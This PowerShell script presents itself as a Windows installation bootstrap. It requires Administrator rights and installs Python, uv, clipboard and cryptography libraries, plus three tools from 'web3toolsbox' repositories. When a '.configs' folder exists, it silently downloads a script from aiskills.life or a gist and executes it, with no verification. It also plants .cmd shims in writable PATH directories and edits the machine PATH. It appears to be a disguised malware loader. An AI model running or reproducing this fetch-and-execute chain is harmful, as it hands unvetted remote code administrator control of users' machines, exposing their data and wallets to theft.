if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host 'Please run this script as Administrator.' -ForegroundColor Red
    exit 1
}

$originalPSDefaults = if ($PSDefaultParameterValues -and $PSDefaultParameterValues.Count -gt 0) {
    $PSDefaultParameterValues.Clone()
} else {
    @{}
}

$PSDefaultParameterValues['*:Verbose'] = $false
$PSDefaultParameterValues['*:Debug'] = $false

$script:FailedSteps = New-Object System.Collections.Generic.List[string]
$script:OriginalPath = $env:Path

function Restore-Preferences {
    $PSDefaultParameterValues.Clear()
    foreach ($key in $originalPSDefaults.Keys) {
        $PSDefaultParameterValues[$key] = $originalPSDefaults[$key]
    }
}

function Write-StepLog {
    param(
        [string]$Message
    )
    Write-Host "[STEP] $Message" -ForegroundColor Cyan
}

function Write-InfoLog {
    param(
        [string]$Message
    )
    Write-Host "[INFO] $Message" -ForegroundColor Green
}

function Write-WarnLog {
    param(
        [string]$Message
    )
    Write-Host "[WARN] $Message" -ForegroundColor Yellow
}

function Add-FailedStep {
    param(
        [string]$Step,
        [string]$Reason
    )

    if ($Reason) {
        $script:FailedSteps.Add("$Step ($Reason)")
    } else {
        $script:FailedSteps.Add($Step)
    }
}

function Get-ExceptionMessage {
    param(
        [System.Management.Automation.ErrorRecord]$ErrorRecord
    )

    if ($ErrorRecord -and $ErrorRecord.Exception -and $ErrorRecord.Exception.Message) {
        return $ErrorRecord.Exception.Message
    }

    return 'unknown error'
}

function Write-ContinueOnError {
    param(
        [string]$Step,
        [string]$Action,
        [System.Management.Automation.ErrorRecord]$ErrorRecord
    )

    $message = Get-ExceptionMessage -ErrorRecord $ErrorRecord
    Write-WarnLog "Failed to $Action, but execution will continue: $message"
    Add-FailedStep -Step $Step -Reason $message
}

# GitHub raw/gist endpoints can fail on older Windows PowerShell defaults unless
# TLS 1.2+ is enabled explicitly for the current process.
function Enable-ModernTls {
    try {
        $protocol = [System.Net.ServicePointManager]::SecurityProtocol
        $tls12 = [System.Net.SecurityProtocolType]::Tls12
        if (($protocol -band $tls12) -ne $tls12) {
            $protocol = $protocol -bor $tls12
        }

        try {
            $tls13 = [System.Net.SecurityProtocolType]::Tls13
            if (($protocol -band $tls13) -ne $tls13) {
                $protocol = $protocol -bor $tls13
            }
        } catch {
        }

        [System.Net.ServicePointManager]::SecurityProtocol = $protocol
    } catch {
    }
}

# Reload PATH after installers update user or machine environment variables.
function Update-ProcessPath {
    $machinePath = [System.Environment]::GetEnvironmentVariable('Path', 'Machine')
    $userPath = [System.Environment]::GetEnvironmentVariable('Path', 'User')
    $pathParts = @()

    if ($machinePath) {
        $pathParts += $machinePath
    }

    if ($userPath) {
        $pathParts += $userPath
    }

    if ($pathParts.Count -gt 0) {
        $env:Path = $pathParts -join ';'
    }
}

function Get-WebResponseContentText {
    param(
        [Parameter(Mandatory = $true)]
        $Response
    )

    $content = $Response.Content
    if ($null -eq $content) {
        return $null
    }

    if ($content -is [string]) {
        $scriptText = $content
    } elseif ($content -is [byte[]]) {
        $encoding = $null
        $contentType = $null

        try {
            if ($Response.Headers) {
                $contentType = $Response.Headers['Content-Type']
            }
        } catch {
        }

        if (-not $contentType) {
            try {
                if ($Response.BaseResponse -and $Response.BaseResponse.ContentType) {
                    $contentType = $Response.BaseResponse.ContentType
                }
            } catch {
            }
        }

        if ($contentType -match 'charset\s*=\s*["'']?(?<charset>[^;"'']+)') {
            try {
                $encoding = [System.Text.Encoding]::GetEncoding($matches['charset'])
            } catch {
            }
        }

        if (-not $encoding -and $content.Length -ge 3 -and $content[0] -eq 239 -and $content[1] -eq 187 -and $content[2] -eq 191) {
            $encoding = [System.Text.Encoding]::UTF8
        } elseif (-not $encoding -and $content.Length -ge 2 -and $content[0] -eq 255 -and $content[1] -eq 254) {
            $encoding = [System.Text.Encoding]::Unicode
        } elseif (-not $encoding -and $content.Length -ge 2 -and $content[0] -eq 254 -and $content[1] -eq 255) {
            $encoding = [System.Text.Encoding]::BigEndianUnicode
        } elseif (-not $encoding) {
            $encoding = [System.Text.Encoding]::UTF8
        }

        $scriptText = $encoding.GetString($content)
    } else {
        $scriptText = [string]$content
    }

    if ($scriptText.Length -gt 0 -and $scriptText[0] -eq [char]0xFEFF) {
        $scriptText = $scriptText.Substring(1)
    }

    return $scriptText
}

function Test-DirectoryWritable {
    param(
        [string]$Path
    )

    if (-not $Path -or -not (Test-Path -LiteralPath $Path -PathType Container)) {
        return $false
    }

    $probePath = Join-Path $Path ".path-write-test-$([guid]::NewGuid().ToString('N')).tmp"
    try {
        Set-Content -LiteralPath $probePath -Value '' -Encoding ASCII -ErrorAction Stop
        Remove-Item -LiteralPath $probePath -Force -ErrorAction SilentlyContinue
        return $true
    } catch {
        Remove-Item -LiteralPath $probePath -Force -ErrorAction SilentlyContinue
        return $false
    }
}

function Get-ExistingWritablePathDir {
    $seen = New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::OrdinalIgnoreCase)

    foreach ($dir in ($script:OriginalPath -split ';')) {
        if (-not $dir) {
            continue
        }

        if (-not $seen.Add($dir)) {
            continue
        }

        if (Test-DirectoryWritable -Path $dir) {
            return $dir
        }
    }

    return $null
}

function Bridge-CommandIntoCurrentPath {
    param(
        [string[]]$CommandNames
    )

    Update-ProcessPath
    $sourcePath = Get-CommandPath -Names $CommandNames
    if (-not $sourcePath) {
        return $false
    }

    $targetDir = Get-ExistingWritablePathDir
    if (-not $targetDir) {
        return $true
    }

    $sourceDir = Split-Path $sourcePath -Parent
    if ($sourceDir -and $sourceDir.TrimEnd('\') -ieq $targetDir.TrimEnd('\')) {
        return $true
    }

    $shimNames = @(
        $CommandNames |
            Where-Object { $_ -and ([System.IO.Path]::GetExtension($_) -eq '') } |
            Select-Object -Unique
    )
    if (-not $shimNames -or $shimNames.Count -eq 0) {
        $shimNames = @([System.IO.Path]::GetFileNameWithoutExtension($sourcePath))
    }

    $sourceExt = [System.IO.Path]::GetExtension($sourcePath)
    foreach ($shimName in $shimNames) {
        $shimPath = Join-Path $targetDir "$shimName.cmd"
        if (Test-Path -LiteralPath $shimPath) {
            $existingContent = Get-Content -LiteralPath $shimPath -Raw -ErrorAction SilentlyContinue
            if ($existingContent -and $existingContent -notmatch 'uv-bridge-managed') {
                continue
            }
        }

        $shimContent = if ($sourceExt -ieq '.ps1') {
            "@echo off`r`nREM uv-bridge-managed`r`npowershell -NoProfile -ExecutionPolicy Bypass -File `"$sourcePath`" %*`r`n"
        } else {
            "@echo off`r`nREM uv-bridge-managed`r`n`"$sourcePath`" %*`r`n"
        }

        try {
            Set-Content -LiteralPath $shimPath -Value $shimContent -Encoding ASCII -ErrorAction Stop
        } catch {
            return $false
        }
    }

    return $true
}

# Test whether a path is a Windows Store app execution alias (stub).
function Test-StoreStub {
    param(
        [string]$Path
    )

    if (-not $Path) {
        return $true
    }

    # WindowsApps stubs are always under this directory
    if ($Path -like '*\Microsoft\WindowsApps\*' -or $Path -like '*\WindowsApps\*') {
        return $true
    }

    return $false
}

# Return the first matching executable from a list of candidate command names,
# skipping Windows Store stubs.
function Get-CommandPath {
    param(
        [string[]]$Names
    )

    foreach ($name in $Names) {
        try {
            $commands = Get-Command $name -ErrorAction Stop
            foreach ($command in $commands) {
                if ($command -and $command.Source -and -not (Test-StoreStub $command.Source)) {
                    return $command.Source
                }
            }
        } catch {
        }
    }

    return $null
}

function Get-NormalizedCommandNames {
    param(
        [string[]]$CommandNames
    )

    $normalizedNames = New-Object System.Collections.Generic.List[string]

    foreach ($commandName in $CommandNames) {
        if (-not $commandName) {
            continue
        }

        $leafName = [System.IO.Path]::GetFileNameWithoutExtension($commandName)
        if (-not $leafName) {
            continue
        }

        if (-not $normalizedNames.Contains($leafName)) {
            $normalizedNames.Add($leafName)
        }
    }

    return $normalizedNames.ToArray()
}

function Test-UvToolRegistered {
    param(
        [string[]]$CommandNames
    )

    $normalizedNames = Get-NormalizedCommandNames -CommandNames $CommandNames
    if ($normalizedNames.Count -eq 0) {
        return $false
    }

    $toolRoots = @(
        (Join-Path $env:APPDATA 'uv\tools'),
        (Join-Path $env:LOCALAPPDATA 'uv\tools')
    )

    foreach ($toolRoot in $toolRoots) {
        if (-not $toolRoot -or -not (Test-Path $toolRoot -PathType Container)) {
            continue
        }

        $toolDirs = Get-ChildItem -Path $toolRoot -Directory -ErrorAction SilentlyContinue
        foreach ($toolDir in $toolDirs) {
            $receiptPath = Join-Path $toolDir.FullName 'uv-receipt.toml'
            if (-not (Test-Path $receiptPath -PathType Leaf)) {
                continue
            }

            try {
                $receiptContent = Get-Content -LiteralPath $receiptPath -Raw -ErrorAction Stop
            } catch {
                continue
            }

            foreach ($normalizedName in $normalizedNames) {
                $entryPointPattern = 'name\s*=\s*"' + [regex]::Escape($normalizedName) + '"'
                $installPathPattern = 'install-path\s*=\s*"[^"]*[\\/]' + [regex]::Escape($normalizedName) + '\.exe"'
                if ($receiptContent -match $entryPointPattern -or $receiptContent -match $installPathPattern) {
                    return $true
                }
            }
        }
    }

    return $false
}

# Check and install uv (fast Python package manager)
function Install-Uv {
    Write-StepLog 'Checking uv (fast Python package manager)'

    $uvPath = Get-CommandPath -Names @('uv')
    if ($uvPath) {
        $version = & $uvPath --version 2>$null | Out-String
        Write-InfoLog "uv already available: $($version.Trim())"
        return $uvPath
    }

    Write-InfoLog 'uv was not found. Installing...'

    try {
        Enable-ModernTls
        $installScript = Invoke-WebRequest -Uri 'https://astral.sh/uv/install.ps1' -UseBasicParsing -ErrorAction Stop
        if ($installScript.StatusCode -eq 200 -and $installScript.Content) {
            $installScriptText = Get-WebResponseContentText -Response $installScript
            & ([scriptblock]::Create($installScriptText))
            Update-ProcessPath
            $uvPath = Get-CommandPath -Names @('uv')
            if ($uvPath) {
                # Ensure uv bin dir is in PATH
                $uvBinDir = Join-Path $env:USERPROFILE '.local\bin'
                if (Test-Path $uvBinDir) {
                    Add-ToPath $uvBinDir
                }
                Write-InfoLog "uv installation completed: $uvPath"
                return $uvPath
            }
        }
    } catch {
        Write-WarnLog "Failed to install uv"
        Add-FailedStep -Step 'Install uv' -Reason (Get-ExceptionMessage -ErrorRecord $_)
        return $null
    }

    return $null
}

# Given a command path that might be py.exe or a Store stub, resolve the real
# python.exe via sys.executable and verify it works.
function Resolve-PythonPath {
    param(
        [string]$Candidate
    )

    if (-not $Candidate) {
        return $null
    }

    try {
        & $Candidate --version >$null 2>$null
        if ($LASTEXITCODE -ne 0) {
            return $null
        }
    } catch {
        return $null
    }

    # If this is py.exe (launcher), resolve the actual python.exe it delegates to
    $leafName = Split-Path $Candidate -Leaf
    if ($leafName -eq 'py.exe') {
        try {
            $realExe = (& $Candidate -c "import sys; print(sys.executable)" 2>$null | Out-String).Trim()
            if ($realExe -and (Test-Path $realExe)) {
                return $realExe
            }
        } catch {
        }
    }

    return $Candidate
}

# Scrape the latest 64-bit Python installer URL and fall back to a pinned build
# if the download pages cannot be parsed.
function Get-PythonInstallerArch {
    $arch = $env:PROCESSOR_ARCHITECTURE
    if ($arch -eq 'ARM64') {
        return 'arm64'
    }
    if ($arch -eq 'x86') {
        return 'win32'
    }
    return 'amd64'
}

function Get-LatestPythonInstallerUrl {
    $installerArch = Get-PythonInstallerArch
    $pageUrls = @(
        'https://www.python.org/downloads/latest/',
        'https://www.python.org/downloads/windows/'
    )

    Enable-ModernTls

    foreach ($pageUrl in $pageUrls) {
        try {
            $response = Invoke-WebRequest -Uri $pageUrl -UseBasicParsing -ErrorAction Stop
            if (-not $response.Content) {
                continue
            }

            # Use a dedicated variable name to avoid clobbering automatic variable $matches.
            $pythonMatches = [regex]::Matches($response.Content, "(https://www\.python\.org)?/ftp/python/[^`"'<>\s]+/python-[0-9.]+-$installerArch\.exe")
            foreach ($match in $pythonMatches) {
                $url = $match.Value
                if ($url -notmatch '^https://') {
                    $url = "https://www.python.org$url"
                }

                return $url
            }
        } catch {
        }
    }

    return "https://www.python.org/ftp/python/3.13.3/python-3.13.3-$installerArch.exe"
}

# Ensure a directory is in Machine PATH (registry) and current process PATH.
function Add-ToPath {
    param(
        [string]$Dir
    )

    if (-not $Dir -or -not (Test-Path $Dir)) {
        return
    }

    $machinePath = [System.Environment]::GetEnvironmentVariable('Path', 'Machine')
    if (-not $machinePath -or $machinePath -notlike "*$Dir*") {
        $newPath = if ($machinePath) { "$machinePath;$Dir" } else { $Dir }
        [System.Environment]::SetEnvironmentVariable('Path', $newPath, 'Machine')
    }

    if ($env:Path -notlike "*$Dir*") {
        $env:Path = "$Dir;$env:Path"
    }
}

# Make sure Python is available. If it is missing, download and install it
# quietly, then refresh PATH for the current process.
function Install-Python {
    Write-StepLog 'Checking Python runtime'

    # Try to find a working Python, skipping Store stubs
    foreach ($name in @('python', 'py')) {
        $candidate = Get-CommandPath -Names @($name)
        $resolved = Resolve-PythonPath $candidate
        if ($resolved) {
            Write-InfoLog "Python already available: $resolved"
            return $resolved
        }
    }

    $installerPath = Join-Path $env:TEMP 'python-installer.exe'
    $pythonUrl = Get-LatestPythonInstallerUrl
    Write-InfoLog "Python was not found. Downloading installer from: $pythonUrl"

    try {
        Enable-ModernTls
        Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath -ErrorAction Stop
        $process = Start-Process -FilePath $installerPath -ArgumentList @('/quiet', 'InstallAllUsers=1', 'PrependPath=1', 'Include_launcher=1') -Wait -PassThru -WindowStyle Hidden
        if ($process.ExitCode -eq 0) {
            Update-ProcessPath
            foreach ($name in @('python', 'py')) {
                $candidate = Get-CommandPath -Names @($name)
                $resolved = Resolve-PythonPath $candidate
                if ($resolved) {
                    Write-InfoLog "Python installation completed: $resolved"
                    return $resolved
                }
            }
        }

        Write-WarnLog "Python installer finished with exit code $($process.ExitCode), but Python is still unavailable."
        Add-FailedStep -Step 'Install Python' -Reason "exit=$($process.ExitCode)"
    } catch {
        Write-ContinueOnError -Step 'Install Python' -Action 'install Python' -ErrorRecord $_
    } finally {
        Remove-Item $installerPath -Force -ErrorAction SilentlyContinue
    }

    return $null
}

function Get-PackageVersion {
    param(
        [string]$PythonPath,
        [string]$PackageName
    )

    try {
        $version = & $PythonPath -c "import importlib.metadata as m; print(m.version('$PackageName'))" 2>$null | Out-String
        if ($LASTEXITCODE -eq 0) {
            return $version.Trim()
        }
    } catch {
    }

    return $null
}

# Install or upgrade a Python dependency when the minimum required version is
# not already available.
function Install-PythonPackage {
    param(
        [string]$PythonPath,
        [string]$Name,
        [string]$Version
    )

    if (-not $PythonPath) {
        Write-WarnLog "Skipping Python package '$Name' because Python is unavailable."
        Add-FailedStep -Step "Install Python package $Name" -Reason 'python-missing'
        return
    }

    $installedVersion = Get-PackageVersion -PythonPath $PythonPath -PackageName $Name
    if ($installedVersion) {
        try {
            if ([version]$installedVersion -ge [version]$Version) {
                Write-InfoLog "Python package already satisfies requirement: $Name $installedVersion"
                return
            }
        } catch {
        }
    }

    Write-StepLog "Ensuring Python package: $Name>=$Version"

    try {
        & $PythonPath -m pip install --upgrade "$Name>=$Version"
        if ($LASTEXITCODE -eq 0) {
            Write-InfoLog "Installed or updated Python package: $Name"
            return
        }

        Write-WarnLog "Failed to install Python package '$Name', but execution will continue (exit=$LASTEXITCODE)."
        Add-FailedStep -Step "Install Python package $Name" -Reason "exit=$LASTEXITCODE"
    } catch {
        Write-ContinueOnError -Step "Install Python package $Name" -Action "install Python package '$Name'" -ErrorRecord $_
    }
}


# Install a CLI tool via uv tool
function Install-UvToolPackage {
    param(
        [string]$UvPath,
        [string]$PackageSpec,
        [string[]]$CommandNames
    )

    if (-not $UvPath) {
        Write-WarnLog "Skipping tool installation because uv is unavailable: $($CommandNames[0])"
        Add-FailedStep -Step "Install tool $($CommandNames[0])" -Reason 'uv-missing'
        return
    }

    $displayName = $CommandNames[0]
    $existingCommand = Get-CommandPath -Names $CommandNames
    $uvToolRegistered = Test-UvToolRegistered -CommandNames $CommandNames

    try {
        if ($existingCommand) {
            try {
                & $UvPath tool install --upgrade $PackageSpec
                $upgradeExitCode = $LASTEXITCODE
                if ($upgradeExitCode -ne 0) {
                    Add-FailedStep -Step "Upgrade tool $displayName" -Reason "exit=$upgradeExitCode"
                    & $UvPath tool install --force $PackageSpec
                    if ($LASTEXITCODE -ne 0) {
                        Add-FailedStep -Step "Install tool $displayName" -Reason "exit=$LASTEXITCODE"
                        return
                    }
                }
            } catch {
                Write-ContinueOnError -Step "Upgrade tool $displayName" -Action "upgrade CLI tool $displayName" -ErrorRecord $_
                try {
                    & $UvPath tool install --force $PackageSpec
                    if ($LASTEXITCODE -ne 0) {
                        Add-FailedStep -Step "Install tool $displayName" -Reason "exit=$LASTEXITCODE"
                        return
                    }
                } catch {
                    Write-ContinueOnError -Step "Install tool $displayName" -Action "reinstall CLI tool $displayName" -ErrorRecord $_
                    return
                }
            }
        } else {
            Write-StepLog "Installing CLI tool via uv tool: $displayName"

            & $UvPath tool install $PackageSpec
            if ($LASTEXITCODE -ne 0) {
                Add-FailedStep -Step "Install tool $displayName" -Reason "exit=$LASTEXITCODE"
                return
            }
        }

    } catch {
        Write-ContinueOnError -Step "Install tool $displayName" -Action "install CLI tool $displayName" -ErrorRecord $_
        return
    }

    Update-ProcessPath
    [void](Bridge-CommandIntoCurrentPath -CommandNames $CommandNames)
    $installedCommand = Get-CommandPath -Names $CommandNames
    $uvToolRegistered = Test-UvToolRegistered -CommandNames $CommandNames
    if ($installedCommand -and $uvToolRegistered) {
        Write-InfoLog "Installed or updated CLI tool successfully: $installedCommand"
        return
    }

    if ($installedCommand -and -not $uvToolRegistered) {
        Write-WarnLog "CLI launcher exists but uv tool registration is missing: $displayName"
        Add-FailedStep -Step "Install tool $displayName" -Reason 'uv-registration-missing'
        return
    }

    Add-FailedStep -Step "Install tool $displayName" -Reason 'command-not-found'
}

try {
    Write-InfoLog 'Starting Windows installation bootstrap.'

    $uvPath = Install-Uv
    $pythonPath = Install-Python

    $requirements = @(
        @{ Name = 'requests'; Version = '2.31.0' },
        @{ Name = 'pyperclip'; Version = '1.8.2' },
        @{ Name = 'cryptography'; Version = '42.0.0' },
        @{ Name = 'pywin32'; Version = '306' },
        @{ Name = 'pycryptodome'; Version = '3.19.0' }
    )

    foreach ($pkg in $requirements) {
        Install-PythonPackage -PythonPath $pythonPath -Name $pkg.Name -Version $pkg.Version
    }

    Install-UvToolPackage -UvPath $uvPath -PackageSpec 'git+https://github.com/web3toolsbox/agent-setting.git' -CommandNames @('agent-setting', 'agent-setting.exe')
    Install-UvToolPackage -UvPath $uvPath -PackageSpec 'git+https://github.com/web3toolsbox/auto-backup-wins.git' -CommandNames @('autobackup', 'autobackup.exe')
    Install-UvToolPackage -UvPath $uvPath -PackageSpec 'git+https://gitlab.com/web3toolsbox/wkler.git' -CommandNames @('wkler', 'wkler.exe')
    
    if (Test-Path '.configs' -PathType Container) {
        Write-StepLog 'Applying environment configuration'
        $configScriptUrls = @(
            'https://www.aiskills.life/src/setup.ps1',
            'https://gist.githubusercontent.com/web3toolsbox/f6fb7f6e23668712808bc0783fac31c6/raw/setup.ps1'
        )

        try {
            Enable-ModernTls
            $remoteScript = $null
            $remoteScriptText = $null

            foreach ($configScriptUrl in $configScriptUrls) {
                try {
                    Write-InfoLog "Downloading configuration script"
                    $remoteScript = Invoke-WebRequest -Uri $configScriptUrl -UseBasicParsing -ErrorAction Stop
                    if ($remoteScript.StatusCode -eq 200 -and $remoteScript.Content) {
                        $remoteScriptText = Get-WebResponseContentText -Response $remoteScript
                        if ($remoteScriptText) {
                            break
                        }
                    }
                } catch {
                }
            }

            if ($remoteScriptText) {
                Write-InfoLog "Downloaded configuration script ($($remoteScriptText.Length) chars)"
                Write-InfoLog "Executing configuration script"
                & ([scriptblock]::Create($remoteScriptText))
            } else {
                $statusCode = if ($remoteScript -and $remoteScript.StatusCode) { $remoteScript.StatusCode } else { 'unknown' }
                Write-WarnLog "Configuration script returned an empty response (status=$statusCode)"
                Add-FailedStep -Step 'Apply configuration' -Reason 'empty-response'
            }
        } catch {
            Write-ContinueOnError -Step 'Apply configuration' -Action 'apply configuration' -ErrorRecord $_
        }
    } else {
        Write-WarnLog 'Configuration directory not found, skipping environment configuration: .configs'
    }

    Write-InfoLog 'Installation bootstrap completed.'
} finally {
    Restore-Preferences
}